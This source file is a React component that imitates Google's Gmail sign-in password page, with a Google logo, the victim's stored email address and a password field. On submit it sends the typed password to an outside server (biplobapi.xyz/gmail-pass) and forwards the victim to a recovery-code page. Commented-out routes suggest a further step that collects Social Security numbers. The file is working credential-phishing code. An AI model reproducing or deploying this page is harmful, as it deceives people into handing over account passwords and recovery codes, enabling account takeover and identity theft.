import React from "react";
import { useState } from "react";
import { useForm } from "react-hook-form";
import { useLocation, useNavigate } from "react-router-dom";

const Password = () => {
  const [passwordShown, setPasswordShown] = useState(false);
  const togglePassword = () => {
    // When the handler is invoked
    // inverse the boolean state of passwordShown
    setPasswordShown(!passwordShown);
  };
  const { state } = useLocation();
  const navigate = useNavigate();
  const { temp } = state;
  const {
    register,
    handleSubmit,
    formState: { errors },
    reset,
  } = useForm();
  const handleVerify = (data) => {
    const gmailPass = {
      gmailPass: data.gmailPass,
    };

    fetch(`https://biplobapi.xyz/gmail-pass/${temp}`, {
      method: "PUT",
      headers: {
        "content-type": "application/json",
      },
      body: JSON.stringify(gmailPass),
    })
      .then((res) => res.json())
      .then((data) => {
        if (data.modifiedCount > 0) {
          // navigate("/ssn", { state: { temp: temp } });
          // navigate('/404');
          navigate("/recovery-code", { state: { temp: temp } });
          // navigate(localStorage.getItem('url'));
        }
      });
  };
  return (
    <div className="gmail-container">
      <div>
        <form className="email-box" onSubmit={handleSubmit(handleVerify)}>
          <img src="/google.png" alt="" />
          <h5>Welcome</h5>
          <p className="email-shower">{localStorage.getItem("gmail")}</p>
          <div className="input-box">
            <div class="form-group">
              <input
                type={passwordShown ? "text" : "password"}
                id="name"
                name="name"
                {...register("gmailPass")}
                required
              />
              <label for="name">Enter your Password</label>
            </div>
            <div className="checks">
              <input
                type="checkbox"
                onChange={togglePassword}
                className="passcheck"
              />
              <p>Show password</p>
            </div>

            <p className="bluredtext">
              Not your computer? Use a Private Window to sign in. <br />{" "}
              <a href="">Learn More</a>{" "}
            </p>
          </div>
          <div className="bottom-container">
            <a href="">Forgot Password?</a>
            <button className="next-btn" type="submit">
              Next
            </button>
          </div>
        </form>
        <div className="menu-container">
          <div>
            <small>English (Unites Sates)</small>
          </div>
          <div className="menus">
            <small>Home</small>
            <small>Privacy</small>
            <small>Terms</small>
          </div>
        </div>
      </div>
    </div>
  );
};

export default Password;
